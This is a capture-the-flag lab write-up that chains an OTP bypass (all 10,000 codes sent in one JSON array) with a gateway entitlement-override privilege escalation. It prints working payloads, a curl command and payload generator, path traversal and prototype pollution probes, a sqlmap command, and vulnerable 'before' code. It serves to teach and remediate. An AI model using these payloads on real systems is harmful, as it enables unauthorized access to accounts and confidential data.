---
layout: default
title: "MesaNet Access Panel (OTP Bypass + Broken Access Control) - BugForge"
---

[← Back](./)

# BugForge - MesaNet Access Panel Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-20</span>
  <span><strong>Difficulty:</strong> Hard</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. OTP Bypass via JSON Array Parameter Injection (CWE-287, CWE-799) — sending all 10,000 4-digit codes in a single JSON array bypasses rate limiting
2. Broken Access Control via Gateway Entitlement Override (CWE-639) — injecting `entitlements` field in gateway requests overrides session-based authorization
3. Weak Credentials (CWE-521) — security account uses trivially guessable password
4. Information Disclosure (CWE-200) — dev console exposes full entitlement schema

**Business Impact:** An attacker can bypass OTP-protected administrative interfaces, then escalate from any authenticated account to full access across all backend services — reading confidential research notes, sending classified messages, and accessing personnel records regardless of clearance level.

---

## Objective
Reach the restricted dev application on the MesaNet Access Panel, then continue testing with the information found there.

## Initial Access
```bash
# Target Application
URL: https://lab-XXXXX.labs-app.bugforge.io (rotates on reset)

# Credentials
operator:operator (L3 clearance)
Auth: Session-based (connect.sid cookie, HttpOnly, 24h expiry)
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **OTP Bypass via JSON Array Parameter Injection (CWE-287, CWE-799)** — The `/dev/verify` endpoint accepts a JSON body where the `otp` field can be an array. The server iterates over all elements checking each against the current OTP but only counts the request as one attempt against the 10-attempt rate limit. Sending all 10,000 possible 4-digit codes in a single request guarantees a match.

**CVSS v3.1 Score for OTP Bypass:** **9.8 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

2. **Broken Access Control — Entitlement Override via Gateway (CWE-639)** — The central API gateway at `POST /gateway` accepts a top-level `entitlements` field in the request JSON body and passes it directly to backend services. Backend services use this attacker-controlled value instead of the user's session entitlements.

**CVSS v3.1 Score for Entitlement Override:** **9.8 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | Low |

3. **Weak Credentials (CWE-521)** — The `security` user account uses the password `security123`.

4. **Information Disclosure (CWE-200)** — The dev console's `/dev/spec` endpoint exposes the full internal entitlement structure.

## Enumeration Summary

### Application Analysis

**Target Endpoints Discovered:**

- `POST /gateway` — Central API router (accepts `{id, endpoint, data}`)
- `POST /dev/verify` — OTP verification
- `GET /dev/time-remaining` — OTP window timer
- `GET /dev/spec` — Entitlement schema
- `GET /dev/examples` — Example provisioning payloads
- `POST /api/dev/users` — User provisioning (direct, not via gateway)
- Nexus: `/api/notes/list`, `/api/notes/get`, `/api/notes/create`
- Mail: `/api/mail/inbox`, `/api/mail/get`, `/api/mail/send`
- Rail: `/api/rail/current`, `/api/rail/schedule`, `/api/rail/status`, `/api/rail/announcements`, `/api/rail/create`
- Personnel: `/api/personnel/list`, `/api/personnel/get`, `/api/personnel/org`

### Registered App UUIDs

| App | UUID |
|-----|------|
| Nexus | `a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e` |
| Mail | `b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d` |
| Rail | `c3e8a1f6-4c9a-4b2e-8f6d-6a1c9b3e5f8d` |
| Personnel | `e5b2c8a3-9d4f-4e1b-8c7a-2f6d1a9e3b5c` |

## Attack Chain Visualization
```
┌──────────────────────┐
│  Login as operator   │
│  (operator:operator) │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐     ┌─────────────────────────────────┐
│  POST /dev/verify    │────▶│  Send JSON array with all       │
│  OTP bypass          │     │  10,000 codes (0000-9999)       │
└──────────┬───────────┘     │  Rate limiter counts as 1 try   │
           │                 └─────────────────────────────────┘
           ▼
┌──────────────────────┐
│  Dev Console Access  │
│  /dev                │
│  Read API docs,      │
│  entitlement schema, │
│  app UUIDs           │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐     ┌─────────────────────────────────┐
│  POST /gateway       │────▶│  Inject "entitlements" field in │
│  Entitlement override│     │  request body — gateway passes  │
└──────────┬───────────┘     │  it to backends as-is           │
           │                 └─────────────────────────────────┘
           ▼
┌──────────────────────┐
│  Access confidential │
│  notes, mail, and    │
│  personnel data      │
│  Flag returned       │
└──────────────────────┘
```

**Attack Path Summary:**
1. Authenticate as `operator` with provided credentials
2. Discover OTP-protected `/dev` endpoint via fuzzing
3. Bypass OTP by sending all 10,000 codes as a JSON array (counts as 1 attempt)
4. Enumerate dev console to learn entitlement schema and real app UUIDs
5. Inject `entitlements` field into gateway request body to override session permissions
6. Access confidential data across all services — flag returned in response

---

## Exploitation Path

### Step 1: Reconnaissance — Mapping the Gateway Architecture

After logging in as `operator:operator`, the dashboard reveals a multi-app internal portal (Nexus, Mail, Rail, Personnel). All API calls route through a single `POST /gateway` endpoint with a JSON body:

```json
{
  "id": "<app-uuid>",
  "endpoint": "/api/...",
  "data": { ... }
}
```

Endpoint fuzzing with ffuf identified the registered applications and their API routes. The `/dev` endpoint was discovered but protected by a 4-digit OTP that rotates every 60 seconds with a 10-attempt rate limit per cycle.

### Step 2: OTP Bypass — JSON Array Parameter Injection

The `/dev/verify` endpoint accepts `POST` with JSON body {% raw %}`{"otp": "1234"}`{% endraw %}. Testing revealed it also accepts an array:

```json
POST /dev/verify
Content-Type: application/json

{"otp": ["0000", "0001", "0002", ..., "9999"]}
```

The server iterates over every element in the array, checking each against the current OTP. Critically, the entire request counts as **one attempt** against the rate limit. With all 10,000 possible 4-digit codes in a single request, a match is guaranteed.

```bash
# Generate the payload
python3 -c "
import json
codes = [f'{i:04d}' for i in range(10000)]
print(json.dumps({'otp': codes}))
" > /tmp/otp-payload.json

# Send it
curl -s -X POST "$URL/dev/verify" \
  -H "Content-Type: application/json" \
  -b "connect.sid=$COOKIE" \
  -d @/tmp/otp-payload.json \
  -o /dev/null -w "%{http_code}"
# Response: 302 Found. Redirecting to /dev
```

An HTTP/2 race condition approach (`otp-race.py`) was also developed to try concurrent individual requests, but the JSON array method was simpler and fully reliable.

### Step 3: Dev Console Enumeration

With OTP bypassed, the dev console revealed:

- **Gateway API documentation** with all registered app UUIDs and endpoint schemas
- **User provisioning API** at `POST /api/dev/users` (direct, not through gateway)
- **Entitlement schema** at `/dev/spec` showing the exact structure:

```json
{
  "entitlements": {
    "nexus": {
      "access": true,
      "read": ["public", "restricted", "confidential"],
      "write": ["public", "restricted", "confidential"]
    },
    "mail": {
      "access": true,
      "canSend": true,
      "maxClassification": "confidential"
    }
  }
}
```

Note: The dev console displays dummy UUIDs (`11111111-...`, `22222222-...`) that are documentation-only and don't work. The real UUIDs were discovered during earlier endpoint fuzzing.

### Step 4: Broken Access Control — Entitlement Override via Gateway

The critical vulnerability: the gateway accepts an `entitlements` field in the top-level request body and passes it to backend services, which use it **instead of** the user's session entitlements.

Any authenticated user — even the L1 `security` account with no Nexus access — can escalate privileges:

```http
POST /gateway HTTP/1.1
Content-Type: application/json
Cookie: connect.sid=<session>

{
  "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
  "endpoint": "/api/notes/list",
  "data": {},
  "entitlements": {
    "nexus": {
      "access": true,
      "read": ["public", "restricted", "confidential"]
    }
  }
}
```

This bypasses:
- **Service access controls** — security user can access Nexus (normally denied)
- **Classification restrictions** — public-only user can read confidential notes
- **Mail restrictions** — any user can send confidential-classified messages

The flag was returned as an extra `flag` field in the JSON response when the entitlement override was used on the `notes/list` endpoint.

---

## Flag / Objective Achieved

```
bug{YjtROkuc4hQW1S8XJ8aV8vxdeqOwaeA4}
```

---

## Key Learnings

- **JSON type coercion as an attack vector** — When an API expects a string but also accepts arrays, the iteration behavior can bypass rate limiters that count requests rather than individual values. Always check how endpoints handle unexpected types (arrays, objects, null) for scalar parameters.
- **Gateway trust boundaries** — A central API gateway that blindly forwards request body fields to backend services creates a privilege escalation path. The gateway must strip or validate all fields except the expected `id`, `endpoint`, and `data`.
- **Entitlement-based access control must be server-authoritative** — Backend services should derive entitlements from the authenticated session, never from client-supplied request data.
- **Dev consoles as attack surface amplifiers** — Even when OTP-protected, the dev console exposed the exact entitlement schema needed to craft the override. The information disclosure turned a generic "extra fields in JSON" idea into a precise, targeted exploit.

---

## Tools Used

- **curl** - Manual API testing and OTP payload delivery
- **ffuf** - Endpoint discovery across all gateway apps
- **Python 3** - OTP payload generation and race condition script (otp-race.py)
- **Burp Suite** - Request interception and gateway parameter testing
- **sqlmap** - SQL injection verification (confirmed parameterized queries)

---

## Remediation

### 1. OTP Bypass via JSON Array (CVSS: 9.8 - Critical)
**Issue:** The OTP verification endpoint accepts array values for the `otp` parameter and iterates over all elements while counting the entire request as a single attempt.
**CWE Reference:** CWE-287 - Improper Authentication, CWE-799 - Improper Control of Interaction Frequency
**Fix:**
```javascript
// BEFORE (Vulnerable)
app.post('/dev/verify', (req, res) => {
  const otp = req.body.otp;
  // If otp is an array, iterates all values but counts as 1 attempt
  const values = Array.isArray(otp) ? otp : [otp];
  for (const val of values) {
    if (val === currentOtp) return res.redirect('/dev');
  }
});

// AFTER (Secure)
app.post('/dev/verify', (req, res) => {
  const otp = req.body.otp;
  // Reject non-string types
  if (typeof otp !== 'string' || !/^\d{4}$/.test(otp)) {
    return res.status(400).json({ error: 'OTP must be a 4-digit string' });
  }
  incrementAttemptCounter(req.session);
  if (otp === currentOtp) return res.redirect('/dev');
});
```

### 2. Broken Access Control — Gateway Entitlement Override (CVSS: 9.8 - Critical)
**Issue:** The API gateway forwards the client-supplied `entitlements` field to backend services, which use it instead of session entitlements.
**CWE Reference:** CWE-639 - Authorization Bypass Through User-Controlled Key
**Fix:**
```javascript
// BEFORE (Vulnerable)
app.post('/gateway', (req, res) => {
  const { id, endpoint, data, entitlements } = req.body;
  // entitlements from request body passed to backend
  forwardToService(id, endpoint, { data, entitlements, user: req.session.user });
});

// AFTER (Secure)
app.post('/gateway', (req, res) => {
  // Only extract expected fields — entitlements come from session
  const { id, endpoint, data } = req.body;
  const entitlements = req.session.user.entitlements;
  forwardToService(id, endpoint, { data, entitlements, user: req.session.user });
});
```

### 3. Weak Credentials (CVSS: 5.3 - Medium)
**Issue:** The `security` account uses a trivially guessable password (`security123`).
**CWE Reference:** CWE-521 - Weak Password Requirements
**Fix:** Enforce minimum password complexity requirements and prevent passwords that contain the username.

### 4. Information Disclosure — Entitlement Schema (CVSS: 3.7 - Low)
**Issue:** The dev console's `/dev/spec` endpoint exposes the full internal entitlement structure.
**CWE Reference:** CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
**Fix:** Remove or restrict the spec endpoint to development environments only.

---

## Failed Attempts

### Approach 1: SQL Injection
```bash
sqlmap -r req.txt --batch --level=5 --risk=3
```
**Result:** Failed - All endpoints use parameterized queries (SQLite). No injection points found.

### Approach 2: SSRF via Gateway Endpoint Field
```json
{"id": "<uuid>", "endpoint": "/../../../etc/passwd", "data": {}}
```
**Result:** Failed - Gateway enforces `/api/` prefix and normalizes path traversal.

### Approach 3: Mail IDOR via Gateway
```json
{"id": "<mail-uuid>", "endpoint": "/api/mail/inbox", "data": {"userId": 1}}
```
**Result:** Failed - `userId` check uses server-side session, not overridable through gateway.

### Approach 4: OTP Race Condition (HTTP/2 Concurrent Requests)
```bash
python3 otp-race.py --url $URL --cookie "$COOKIE" --batch-size 200
```
**Result:** Partially worked but unreliable - Server serialized most requests. JSON array method was simpler and 100% reliable.

### Approach 5: Prototype Pollution
```json
{"__proto__": {"entitlements": {"nexus": {"access": true}}}}
```
**Result:** Failed - Server not vulnerable to prototype pollution.

---

## OWASP Top 10 Coverage

- **A01:2021** - Broken Access Control (gateway entitlement override allows any user to escalate privileges across all services)
- **A07:2021** - Identification and Authentication Failures (OTP bypass via JSON array parameter injection, weak credentials)
- **A04:2021** - Insecure Design (gateway architecture trusts client-supplied entitlements without validation)

---

## References

**Authentication & Access Control:**
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)

**OWASP Resources:**
- [OWASP API Security Top 10 — API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [PortSwigger — API Testing](https://portswigger.net/web-security/api-testing)

---

**Tags:** `#otp-bypass` `#broken-access-control` `#entitlement-override` `#api-gateway` `#bugforge` `#json-array-injection`
